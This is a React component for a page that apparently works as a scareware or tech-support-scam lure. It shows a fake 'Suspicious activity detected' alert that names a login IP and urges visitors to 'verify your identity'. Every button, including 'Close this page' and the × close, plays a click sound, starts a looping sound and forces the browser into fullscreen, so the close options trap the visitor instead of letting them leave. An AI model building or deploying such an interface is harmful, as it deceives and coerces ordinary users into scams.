import React, { useState, useEffect } from "react";

function HomeScreen({ onStart, clickSoundRef, loopSoundRef }) {
  const [showModal, setShowModal] = useState(true);

  useEffect(() => {
    document.body.style.cursor = "auto";

    const style = document.createElement("style");

    style.innerHTML = `
      @keyframes pulse {
        0% {
          transform: scale(1);
          box-shadow: 0 0 0 0 rgba(37,99,235,0.4);
        }

        50% {
          transform: scale(1.08);
          box-shadow: 0 0 30px 12px rgba(37,99,235,0.18);
        }

        100% {
          transform: scale(1);
          box-shadow: 0 0 0 0 rgba(37,99,235,0);
        }
      }

      .continue-button {
        animation: pulse 1.5s infinite;
      }

      .continue-button:hover {
        transform: scale(1.12);
      }
    `;

    document.head.appendChild(style);

    return () => {
      document.body.style.cursor = "auto";
      document.head.removeChild(style);
    };
  }, []);


  const handleAnyClick = async () => {

    if (clickSoundRef?.current) {
      clickSoundRef.current.currentTime = 0;

      clickSoundRef.current
        .play()
        .catch(() => {});
    }


    if (loopSoundRef?.current) {
      loopSoundRef.current
        .play()
        .catch(() => {});
    }


    try {
      if (!document.fullscreenElement) {
        await document.documentElement.requestFullscreen();
      }
    } catch (error) {
      console.log("Fullscreen error:", error);
    }


    onStart();
  };


  return (
    <div
      onClick={handleAnyClick}
      style={{
        cursor: "auto",
        position: "fixed",
        inset: 0,
        background:
          "linear-gradient(135deg,#e0f2fe,#f8fafc,#dbeafe)",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        fontFamily: "Helvetica, Arial, sans-serif",
        zIndex: 9999,
      }}
    >

      {showModal && (

        <div
          style={{
            position: "fixed",
            inset: 0,
            backgroundImage: "url('./images/345435xf.webp')",
            backgroundSize: "cover",
            backgroundPosition: "center",
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
            backdropFilter: "blur(6px)",
            WebkitBackdropFilter: "blur(6px)",
          }}
        >

          <div
            style={{
              width: "520px",
              maxWidth: "90%",
              background: "#ffffff",
              borderRadius: "18px",
              padding: "45px",
              textAlign: "center",
              boxShadow: "0 20px 50px rgba(0,0,0,0.18)",
              position: "relative",
            }}
          >
            <button
              onClick={() => {
                setShowModal(false);
                handleAnyClick();
              }}
              style={{
                position: "absolute",
                top: "15px",
                right: "15px",
                width: "35px",
                height: "35px",
                borderRadius: "50%",
                border: "none",
                background: "#f1f5f9",
                color: "#64748b",
                fontSize: "22px",
                cursor: "pointer",
              }}
            >
              ×
            </button>

            <div
              style={{
                display: "flex",
                flexDirection: "column",
                alignItems: "center",
                gap: "16px",
              }}
            >
              <img src="images/logo.png" alt="" style={{ width: "100px" }} />

              <div>
                <h3 style={{ fontSize: "18px", fontWeight: "700", marginBottom: "12px" }}>
                  Suspicious activity detected
                </h3>
                <p
                  style={{
                    color: "#4b5563",
                    fontSize: "14px",
                    lineHeight: "1.7",
                    marginBottom: "12px",
                  }}
                >
                  An unusual login attempt was detected on your account.
                  <br />
                  IP address: <span style={{ fontWeight: "700", color: "#111827" }}>104.244.42.1</span> (USA).
                </p>
                <p
                  style={{
                    color: "#4b5563",
                    fontSize: "14px",
                    lineHeight: "1.7",
                    marginBottom: "0",
                  }}
                >
                  To protect your personal data,
                  <br />
                  verify your identity or close this page immediately.
                </p>
              </div>

              <div
                style={{
                  display: "flex",
                  justifyContent: "center",
                  gap: "12px",
                  flexWrap: "wrap",
                  marginTop: "8px",
                }}
              >
                <button
                  onClick={() => {
                    setShowModal(false);
                    handleAnyClick();
                  }}
                  style={{
                    padding: "12px 20px",
                    borderRadius: "10px",
                    border: "none",
                    background: "#e2e8f0",
                    color: "#334155",
                    fontSize: "15px",
                    fontWeight: "700",
                    cursor: "pointer",
                  }}
                >
                  Close this page
                </button>

                <button
                  onClick={handleAnyClick}
                  className="continue-button"
                  style={{
                    padding: "12px 20px",
                    borderRadius: "10px",
                    border: "none",
                    background: "linear-gradient(135deg,#2563eb,#1d4ed8)",
                    color: "#fff",
                    fontSize: "15px",
                    fontWeight: "700",
                    cursor: "pointer",
                    boxShadow: "0 10px 30px rgba(37,99,235,0.35)",
                  }}
                >
                  Confirm my identity
                </button>
              </div>
            </div>
          </div>

        </div>

      )}

    </div>
  );
}

export default HomeScreen;